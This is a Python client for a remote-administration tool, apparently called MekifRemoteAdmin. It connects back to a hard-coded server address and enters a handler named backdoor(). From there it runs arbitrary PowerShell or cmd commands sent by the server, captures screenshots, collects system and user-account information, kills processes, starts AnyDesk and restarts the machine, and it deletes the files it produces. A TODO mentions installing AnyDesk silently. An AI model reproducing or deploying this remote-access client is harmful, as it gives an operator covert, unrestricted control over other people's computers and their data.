from datetime import datetime
from threading import Thread
from termcolor import colored
import subprocess
import threading
import random
import socket
import shutil
import psutil
import time
import sys
import os

# TODO: Install Anydesk Silent Mode


class Client:
    def __init__(self, server, main_path, log_path):
        self.log_path = log_path
        self.main_path = main_path
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 1024
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        self.current_user = os.getlogin()
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname))
        if not os.path.exists(f'{self.main_path}'):
            os.makedirs(self.main_path)

    def connection(self):
        self.logIt(logfile=log_path, debug=True, msg=f'Running connection()...')
        while True:
            time.sleep(1)
            self.logIt(logfile=log_path, debug=True, msg=f'Connecting to Server: {self.server_host} | Port {self.server_port}...')
            try:
                soc.connect((self.server_host, self.server_port))

            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                print(colored(e, 'red'))
                continue

    def anydeskThread(self):
        self.logIt(logfile=log_path, debug=True, msg=f'Starting Anydesk app...')
        return subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])

    def anydesk(self):
        self.logIt(logfile=log_path, debug=True, msg=f'Running anydesk()...')
        try:
            if os.path.exists(r"C:\Program Files (x86)\AnyDesk\anydesk.exe"):
                anydeskThread = threading.Thread(target=self.anydeskThread, name="Run Anydesk")
                anydeskThread.daemon = True
                self.logIt(logfile=log_path, debug=True, msg=f'Calling anydeskThread()...')
                anydeskThread.start()
                self.logIt(logfile=log_path, debug=True, msg=f'Sending Confirmation...')
                soc.send("OK".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            else:
                error = "Anydesk not installed."
                self.logIt(logfile=log_path, debug=True, msg=f'Sending error message: {error}...')
                soc.send(error.encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')
                return

        except FileNotFoundError as e:
            self.logIt(logfile=log_path, debug=True, msg=f'File Error: {e}')
            return

    def install_anydesk(self):
        self.logIt(logfile=log_path, debug=True, msg=f'Running install_anydesk()...')
        pass

    def screenshot(self):
        def make_script():
            self.logIt(logfile=log_path, debug=True, msg='Running make_script()...')
            self.logIt(logfile=log_path, debug=True, msg=f'Writing script to {self.path}...')
            with open(self.path, 'w') as file:
                file.write("Add-Type -AssemblyName System.Windows.Forms\n")
                file.write("Add-Type -AssemblyName System.Drawing\n\n")
                file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
                file.write("$Width  = $Screen.Width\n")
                file.write("$Height = $Screen.Height\n")
                file.write("$Left = $Screen.Left\n")
                file.write("$Top = $Screen.Top\n\n")
                file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
                file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
                file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
                file.write(rf"$bitmap.Save('{self.filename}')")

            time.sleep(0.2)
            self.logIt(logfile=log_path, debug=True, msg=f'Writing script to {self.path} completed.')

        def run_script():
            self.logIt(logfile=log_path, debug=True, msg='Running run_script()...')
            self.logIt(logfile=log_path, debug=True, msg=f'Running PS script...')
            ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
            ps.communicate()
            self.logIt(logfile=log_path, debug=True, msg=f'PS script Completed.')

        def send_file():
            try:
                # Send filename to server
                self.logIt(logfile=log_path, debug=True, msg='Sending file name to server...')
                soc.send(f"{self.filename}".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                # Receive filename Confirmation from the server
                self.logIt(logfile=log_path, debug=True, msg='Waiting for confirmation from server...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Server confirmation: {msg}')
                self.logIt(logfile=log_path, debug=True, msg=f'Getting file size...')
                length = os.path.getsize(self.filename)
                self.logIt(logfile=log_path, debug=True, msg=f'Sending file size to server...')
                soc.send(convert_to_bytes(length))
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                # Send file content
                self.logIt(logfile=log_path, debug=True, msg=f'Opening {self.filename} with read bytes permissions...')
                with open(self.filename, 'rb') as img_file:
                    img_data = img_file.read(1024)
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending file content...')
                    while img_data:
                        soc.send(img_data)
                        if not img_data:
                            break

                        img_data = img_file.read(1024)

                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except ConnectionResetError:
                return False

        def confirm():
            # Send Confirmation to server
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Sending confirmation...')
                soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')
                self.logIt(logfile=log_path, debug=True, msg=f'Waiting for server response...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'From Server: {msg}')

            except (WindowsError, socket.error):
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error')
                return False

        self.logIt(logfile=log_path, debug=True, msg='Running screenshot()...')
        self.logIt(logfile=log_path, debug=True, msg='Calling get_date()...')
        dt = self.get_date()
        self.logIt(logfile=log_path, debug=True, msg='Defining screenshot file name...')
        self.filename = \
            rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {dt}.jpg"
        self.logIt(logfile=log_path, debug=True, msg=f'Screenshot file name: {self.filename}')

        self.logIt(logfile=log_path, debug=True, msg='Defining chunk size...')
        self.chunk = 40960000

        self.logIt(logfile=log_path, debug=True, msg='Creating powershell script file...')
        self.logIt(logfile=log_path, debug=True, msg='Defining script file name...')
        self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
        self.logIt(logfile=log_path, debug=True, msg=f'Script file name: {self.path}')

        self.logIt(logfile=log_path, debug=True, msg='Calling make_script()...')
        make_script()
        self.logIt(logfile=log_path, debug=True, msg='Calling run_script()...')
        run_script()
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file()...')
        send_file()
        self.logIt(logfile=log_path, debug=True, msg='Calling confirm()...')
        confirm()

        self.logIt(logfile=log_path, debug=True, msg=f'Removing \n{self.filename} | \n{self.path}...')
        os.remove(self.filename)
        os.remove(self.path)
        self.logIt(logfile=log_path, debug=True, msg=f'=== End of screenshot() ===')

        return

    def system_information(self):
        def command_to_file():
            try:
                self.logIt(logfile=log_path, debug=True, msg='Opening system information file...')
                sysinfo = open(self.sifile, 'w')
                self.logIt(logfile=log_path, debug=True, msg='Running systeminfo command...')
                sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                sysinfo.write("\n")
                self.logIt(logfile=log_path, debug=True, msg='Running net user command...')
                allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
                sysinfo.write("\n")
                self.logIt(logfile=log_path, debug=True, msg='Closing system information file...')
                sysinfo.close()
                self.logIt(logfile=log_path, debug=True, msg=f'{sysinfo} closed.')

                return True

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'File Error: {e}')
                return False

        def send_file_name():
            try:
                self.logIt(logfile=log_path, debug=True, msg='Sending file name...')
                soc.send(f"{self.sifile}".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        def send_file_size():
            try:
                self.logIt(logfile=log_path, debug=True, msg='Defining file size...')
                length = os.path.getsize(self.sifile)
                self.logIt(logfile=log_path, debug=True, msg=f'File Size: {length}')

                self.logIt(logfile=log_path, debug=True, msg='Sending file size...')
                soc.send(convert_to_bytes(length))
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                return True

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        def send_file_content():
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Opening {self.sifile}...')
                with open(self.sifile, 'rb') as sy_file:
                    self.logIt(logfile=log_path, debug=True, msg='Sending file content...')
                    sys_data = sy_file.read(1024)
                    while sys_data:
                        soc.send(sys_data)
                        if not sys_data:
                            break

                        sys_data = sy_file.read(1024)

                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (WindowsError, socket.error, FileExistsError, FileNotFoundError) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Error: {e}')
                return False

        def confirm():
            try:
                self.logIt(logfile=log_path, debug=True, msg='Waiting for message from server...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'From Server: {msg}')

                self.logIt(logfile=log_path, debug=True, msg=f'Sending confirmation message...')
                soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        self.logIt(logfile=log_path, debug=True, msg='Calling get_date()...')
        dt = self.get_date()

        self.logIt(logfile=log_path, debug=True, msg='Defining file name...')
        self.sifile = rf"c:\MekifRemoteAdmin\systeminfo {self.hostname} {str(self.localIP)} {dt}.txt"
        self.logIt(logfile=log_path, debug=True, msg=f'File name: {self.sifile}')

        self.logIt(logfile=log_path, debug=True, msg='Calling command_to_file()...')
        command_to_file()
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file_name()...')
        send_file_name()
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file_size()...')
        send_file_size()
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file_content()...')
        send_file_content()
        self.logIt(logfile=log_path, debug=True, msg='Calling confirm()...')
        confirm()

        self.logIt(logfile=log_path, debug=True, msg='Removing system information file...')
        os.remove(self.sifile)
        self.logIt(logfile=log_path, debug=True, msg=f'=== End of system_information() ===')

    def get_date(self):
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))

        return dt

    def send_file(self, filename):
        def send_file_name():
            try:
                self.logIt(logfile=log_path, debug=True, msg='Sending file name...')
                soc.send(filename.encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                self.logIt(logfile=log_path, debug=True, msg='Waiting for confirmation from server...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Server Message: {msg}')

                return True

            except (WindowsError, socket.error):
                self.logIt(logfile=log_path, debug=True, msg='Connection Error')
                return False

        def send_file_size():
            self.logIt(logfile=log_path, debug=True, msg='Getting file size...')
            length = os.path.getsize(filename)
            self.logIt(logfile=log_path, debug=True, msg=f'File Size: {length}.')
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Sending file size: {length}...')
                soc.send(convert_to_bytes(length))
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                return length

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        def send_file_content():
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Opening {filename} with ReadBytes permissions...')
                with open(filename, 'rb') as file:
                    self.logIt(logfile=log_path, debug=True, msg='Reading file content...')
                    data = file.read(1024)
                    self.logIt(logfile=log_path, debug=True, msg='Sending file content...')
                    while data:
                        soc.send(data)
                        if not data:
                            break

                        data = file.read(1024)

                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'File Error: {e}')
                return False

        self.logIt(logfile=log_path, debug=True, msg=f'Running send_file({filename})...')
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file_name()...')
        send_file_name()
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file_size()...')
        send_file_size()
        self.logIt(logfile=log_path, debug=True, msg='Calling send_file_content()...')
        send_file_content()

        self.logIt(logfile=log_path, debug=True, msg=f'=== End of send_file({filename}) ===')

    def execute(self, platform, cmd):
        def run_command():
            if str(platform) == "ps":
                try:
                    self.logIt(logfile=log_path, debug=True, msg=f'Opening {filename}...')
                    with open(filename, 'w') as file:
                        self.logIt(logfile=log_path, debug=True, msg=f'Running PS command: {cmd} to {filename}...')
                        p = subprocess.run(["powershell", "-Command", cmd], stdout=file)

                except FileExistsError as e:
                    self.logIt(logfile=log_path, debug=True, msg=f'Passing File Error: {e}...')
                    pass

            elif str(platform) == "cmd":
                try:
                    self.logIt(logfile=log_path, debug=True, msg=f'Opening {filename}...')
                    with open(filename, 'w') as file:
                        self.logIt(logfile=log_path, debug=True, msg=f'Running CMD command: {cmd} to {filename}...')
                        p = subprocess.run(cmd, stdout=file)

                    self.logIt(logfile=log_path, debug=True, msg=f'Write to file Completed.')

                except FileExistsError:
                    self.logIt(logfile=log_path, debug=True, msg=f'Passing File Error: {e}...')
                    pass

        def send_file_name():
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Sending file name: {filename}...')
                soc.send(filename.encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                self.logIt(logfile=log_path, debug=True, msg=f'Waiting for confirmation...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Server Confirmation: {msg}')

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Error: {e}')

            return

        def send_file_size():
            self.logIt(logfile=log_path, debug=True, msg=f'Getting file size...')
            length = os.path.getsize(filename)
            self.logIt(logfile=log_path, debug=True, msg=f'File Size: {length}')

            self.logIt(logfile=log_path, debug=True, msg=f'Converting to bytes and sending file size...')
            soc.send(convert_to_bytes(length))
            self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            return length

        def send_file_content():
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Opening file: {filename}...')
                with open(filename, 'rb') as file:
                    self.logIt(logfile=log_path, debug=True, msg=f'Reading file content...')
                    data = file.read(1024)
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending file content...')
                    while data:
                        soc.send(data)
                        if not data:
                            break

                        data = file.read(1024)

                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'File Error: {e}')
                return False

        def confirm():
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Waiting for msg from server...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Server Message: {msg}')

                self.logIt(logfile=log_path, debug=True, msg=f'Sending confirmation to server...')
                soc.send(f"{self.hostname} | {self.localIP}: Command: {cmd} Completed.\n".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        self.logIt(logfile=log_path, debug=True, msg=f'VARS: {platform}, {cmd}')
        self.logIt(logfile=log_path, debug=True, msg='Getting current datetime...')
        dt = self.get_date()
        self.logIt(logfile=log_path, debug=True, msg='Defining file name...')
        filename = rf"c:\MekifRemoteAdmin\{platform} {self.hostname} {str(self.localIP)} {dt}.txt"
        self.logIt(logfile=log_path, debug=True, msg=f'File name: {filename}')

        self.logIt(logfile=log_path, debug=True, msg='Calling run_command()...')
        run_command()
        self.logIt(logfile=log_path, debug=True, msg=f'Calling self.send_file({filename})...')
        self.send_file(filename)
        self.logIt(logfile=log_path, debug=True, msg='Calling confirm()...')
        confirm()

        self.logIt(logfile=log_path, debug=True, msg=f'Removing {filename}...')
        os.remove(filename)

        self.logIt(logfile=log_path, debug=True, msg=f'=== End of execute({platform}, {cmd}) ===')

    def free_style(self):
        while True:
            try:
                self.logIt(logfile=log_path, debug=True, msg='Waiting for platform...')
                command = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Received {command}')

                if str(command).lower() == "ps":
                    self.logIt(logfile=log_path, debug=True, msg=f'Waiting for command...')
                    cmd = soc.recv(1024).decode()
                    self.logIt(logfile=log_path, debug=True, msg=f'Calling self.execute({command}, {cmd})...')
                    self.execute("ps", cmd)

                elif str(command).lower() == "cmd":
                    self.logIt(logfile=log_path, debug=True, msg=f'Waiting for command...')
                    cmd = soc.recv(1024).decode()
                    self.logIt(logfile=log_path, debug=True, msg=f'Calling self.execute({command}, {cmd})...')
                    self.execute("cmd", cmd)

                elif str(command).lower() == "instad":
                    self.logIt(logfile=log_path, debug=True, msg=f'Installing Anydesk...')
                    pass

                elif str(command).lower() == "back":
                    msg = "back".encode()
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending back message to server...')
                    soc.send(msg)
                    self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')
                    break

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                print(e)
                break

        return

    def tasks(self):
        def command_to_file():
            self.logIt(logfile=log_path, debug=True, msg=f'Running command_to_file()...')
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Opening file: {self.taskfile}...')
                tskinfo = open(self.taskfile, 'w')

                self.logIt(logfile=log_path, debug=True, msg=f'Writing output to {self.taskfile}...')
                sinfo = subprocess.call(['tasklist'], stdout=tskinfo)
                tskinfo.write("\n")
                self.logIt(logfile=log_path, debug=True, msg=f'Closing file: {self.taskfile}...')
                tskinfo.close()
                self.logIt(logfile=log_path, debug=True, msg=f'File closed.')

                return True

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'File Error: {e}')
                return False

        def send_file_name():
            self.logIt(logfile=log_path, debug=True, msg=f'Running send_file_name()...')
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Sending file name: {self.taskfile}...')
                soc.send(f"{self.taskfile}".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')
                return True

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        def print_file_content():
            self.logIt(logfile=log_path, debug=True, msg=f'Running print_file_content()...')
            self.logIt(logfile=log_path, debug=True, msg=f'Opening file: {self.taskfile}...')
            with open(self.taskfile, 'r') as file:
                self.logIt(logfile=log_path, debug=True, msg=f'Adding content to list...')
                for line in file.readlines():
                    task_list.append(line)

            self.logIt(logfile=log_path, debug=True, msg=f'Printing content from list...')
            for t in task_list:
                print(t)

        def send_file_size():
            self.logIt(logfile=log_path, debug=True, msg=f'Running send_file_size()...')
            self.logIt(logfile=log_path, debug=True, msg=f'Defining file size...')
            length = os.path.getsize(self.taskfile)
            self.logIt(logfile=log_path, debug=True, msg=f'File Size: {length}')

            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Sending file size...')
                soc.send(convert_to_bytes(length))
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')
                return True

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

        def send_file_content():
            self.logIt(logfile=log_path, debug=True, msg=f'Running send_file_content()...')
            self.logIt(logfile=log_path, debug=True, msg=f'Opening file: {self.taskfile}...')
            with open(self.taskfile, 'rb') as tsk_file:
                self.logIt(logfile=log_path, debug=True, msg=f'Reading content from {self.taskfile}...')
                tsk_data = tsk_file.read(1024)
                try:
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending file content...')
                    while tsk_data:
                        soc.send(tsk_data)
                        if not tsk_data:
                            break

                        tsk_data = tsk_file.read(1024)

                    self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

                except (WindowsError, socket.error) as e:
                    self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                    return False

        def confirm():
            self.logIt(logfile=log_path, debug=True, msg=f'Running confirm()...')
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Waiting for confirmation from server...')
                msg = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Server Confirmation: {msg}')

                self.logIt(logfile=log_path, debug=True, msg=f'Sending confirmation...')
                soc.send(f"{self.hostname} | {self.localIP}: Task List Sent.\n".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (WindowsError, socket.error):
                dt = self.get_date()
                return False

        def kill():
            try:
                self.logIt(logfile=log_path, debug=True, msg=f'Waiting for task name...')
                task2kill = soc.recv(1024).decode()
                self.logIt(logfile=log_path, debug=True, msg=f'Task name: {task2kill}')

                self.logIt(logfile=log_path, debug=True, msg=f'Killing {task2kill}...')
                os.system(f'taskkill /IM {task2kill} /F')
                self.logIt(logfile=log_path, debug=True, msg=f'{task2kill} killed.')

                self.logIt(logfile=log_path, debug=True, msg=f'Sending killed confirmation to server...')
                soc.send(f"Task: {task2kill} Killed.".encode())
                self.logIt(logfile=log_path, debug=True, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                return False

            return

        self.logIt(logfile=log_path, debug=True, msg=f'Defining tasks file name...')
        dt = self.get_date()
        self.taskfile = rf"c:\MekifRemoteAdmin\tasks {self.hostname} {str(self.localIP)} {dt}.txt"
        self.logIt(logfile=log_path, debug=True, msg=f'Tasks file name: {self.taskfile}')

        self.logIt(logfile=log_path, debug=True, msg=f'Calling command_to_file()...')
        command_to_file()
        self.logIt(logfile=log_path, debug=True, msg=f'Calling send_file_name()...')
        send_file_name()
        self.logIt(logfile=log_path, debug=True, msg=f'Calling print_file_content()...')
        print_file_content()
        self.logIt(logfile=log_path, debug=True, msg=f'Calling send_file_size()...')
        send_file_size()
        self.logIt(logfile=log_path, debug=True, msg=f'Calling send_file_content()...')
        send_file_content()
        self.logIt(logfile=log_path, debug=True, msg=f'Calling confirm()...')
        confirm()

        self.logIt(logfile=log_path, debug=True, msg=f'Removing file: {self.taskfile}...')
        os.remove(self.taskfile)

        kil = soc.recv(1024).decode()
        if str(kil)[:4].lower() == "kill":
            self.logIt(logfile=log_path, debug=True, msg=f'Calling kill()...')
            kill()

        else:
            return False

    def backdoor(self, soc):
        def intro():
            def send_host_name():
                ident = self.hostname
                try:
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending hostname: {self.hostname}...')
                    soc.send(ident.encode())
                    self.logIt(logfile=log_path, debug=True, msg=f'Send completed.')

                except (WindowsError, socket.error):
                    self.logIt(logfile=log_path, debug=True, msg='Connection Error')
                    return False

            def send_current_user():
                user = self.current_user
                try:
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending current user: {user}...')
                    soc.send(user.encode())
                    self.logIt(logfile=log_path, debug=True, msg=f'Send completed.')

                except (WindowsError, socket.error):
                    return False

            def confirm():
                try:
                    self.logIt(logfile=log_path, debug=True, msg='Waiting for confirmation from server...')
                    message = soc.recv(self.buffer_size).decode()
                    self.logIt(logfile=log_path, debug=True, msg=f'Message from server: {message}')

                except (WindowsError, socket.error):
                    return False

            self.logIt(logfile=log_path, debug=True, msg='Calling send_host_name()...')
            send_host_name()
            self.logIt(logfile=log_path, debug=True, msg='Calling send_current_user()...')
            send_current_user()
            self.logIt(logfile=log_path, debug=True, msg='Calling confirm()...')
            confirm()

        def main_menu():
            self.logIt(logfile=log_path, debug=True, msg='Starting main menu...')
            while True:
                try:
                    self.logIt(logfile=log_path, debug=True, msg='Waiting for command...')
                    command = soc.recv(self.buffer_size).decode()
                    self.logIt(logfile=log_path, debug=True, msg=f'Server Command: {command}')

                except (ConnectionResetError, ConnectionError,
                        ConnectionAbortedError, WindowsError, socket.error) as e:
                    self.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                    break

                try:
                    if len(str(command)) == 0:
                        self.logIt(logfile=log_path, debug=True, msg='Connection Lost')
                        break

                    # Freestyle
                    if str(command).lower() == "freestyle":
                        self.logIt(logfile=log_path, debug=True, msg='Calling freestyle...')
                        self.free_style()

                    # Vital Signs
                    if str(command).lower() == "alive":
                        self.logIt(logfile=log_path, debug=True, msg='Calling Vital Signs...')
                        try:
                            self.logIt(logfile=log_path, debug=True, msg='Answer yes to server')
                            soc.send('yes'.encode())
                            self.logIt(logfile=log_path, debug=True, msg=f'Send completed.')

                        except socket.error:
                            break

                    # Capture Screenshot
                    elif str(command.lower()[:6]) == "screen":
                        self.logIt(logfile=log_path, debug=True, msg='Calling screenshot...')
                        self.screenshot()

                    # Get System Information & Users
                    elif str(command.lower()[:2]) == "si":
                        self.logIt(logfile=log_path, debug=True, msg='Calling system information...')
                        self.system_information()

                    # Get Last Restart Time
                    elif str(command).lower()[:2] == "lr":
                        self.logIt(logfile=log_path, debug=True, msg='Fetching last restart time...')
                        last_reboot = psutil.boot_time()
                        try:
                            self.logIt(logfile=log_path, debug=True, msg='Sending last restart time...')
                            soc.send(f"{self.hostname} | {self.localIP}: "
                                     f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())

                            self.logIt(logfile=log_path, debug=True, msg=f'Send completed.')

                        except ConnectionResetError:
                            break

                    # Get Current Logged-on User
                    elif str(command).lower()[:4] == "user":
                        try:
                            self.logIt(logfile=log_path, debug=True, msg=f'Sending current logged user: {self.current_user}...')
                            soc.send(f"{self.hostname} | {self.localIP}: Current User: {self.current_user}.\n".encode())

                            continue

                        except ConnectionResetError:
                            break

                    # Run Anydesk
                    elif str(command.lower()[:7]) == "anydesk":
                        self.logIt(logfile=log_path, debug=True, msg='Calling anydesk()...')
                        self.anydesk()
                        continue

                    # Task List
                    elif (str(command.lower())[:5]) == "tasks":
                        self.logIt(logfile=log_path, debug=True, msg='Calling tasks()...')
                        self.tasks()

                    # Restart Machine
                    elif str(command.lower()[:7]) == "restart":
                        self.logIt(logfile=log_path, debug=True, msg='Restarting local station...')
                        os.system('shutdown /r /t 1')

                    # Close Connection
                    elif str(command.lower()[:4]) == "exit":
                        self.logIt(logfile=log_path, debug=True, msg='Server closed the connection.')
                        soc.settimeout(1)
                        break

                except (Exception, socket.error) as err:
                    break

        self.logIt(logfile=log_path, debug=True, msg='Calling intro()...')
        intro()
        self.logIt(logfile=log_path, debug=True, msg='Calling main_menu()...')
        main_menu()

    def logIt(self, logfile=None, debug=None, msg=''):
        dt = self.get_date()
        if debug:
            print(f"{dt}: {msg}")

        if logfile is not None:
            try:
                if not os.path.exists(logfile):
                    with open(logfile, 'w') as lf:
                        lf.write(f"{dt}: {msg}\n")
                        return True

                else:
                    with open(logfile, 'a') as lf:
                        lf.write(f"{dt}: {msg}\n")
                    return True

            except FileExistsError:
                pass


def convert_to_bytes(no):
    result = bytearray()
    result.append(no & 255)
    for i in range(3):
        no = no >> 8
        result.append(no & 255)
    return result


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


if __name__ == "__main__":
    client_version = "1.0.0"
    task_list = []
    mekif_path = r'c:\MekifRemoteAdmin'
    log_path = r'c:\MekifRemoteAdmin\client_log.txt'
    servers = [('192.168.1.10', 55400)]

    # Start Client
    while True:
        for server in servers:
            client = Client(server, mekif_path, log_path)

            try:
                client.logIt(logfile=log_path, debug=True, msg='Creating Socket...')
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.logIt(logfile=log_path, debug=True, msg='Defining socket to Reuse address...')
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.logIt(logfile=log_path, debug=True, msg=f'connecting to {server}...')
                soc.connect(server)
                client.logIt(logfile=log_path, debug=True, msg=f'Calling backdoor()...')
                client.backdoor(soc)

            except (WindowsError, socket.error) as e:
                client.logIt(logfile=log_path, debug=True, msg=f'Connection Error: {e}')
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.logIt(logfile=log_path, debug=True, msg=f'Closing socket...')
                soc.close()

        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        client.logIt(logfile=log_path, debug=True, msg='Closing socket...')
        soc.close()
        client.logIt(logfile=log_path, debug=True, msg='Socket closed...')
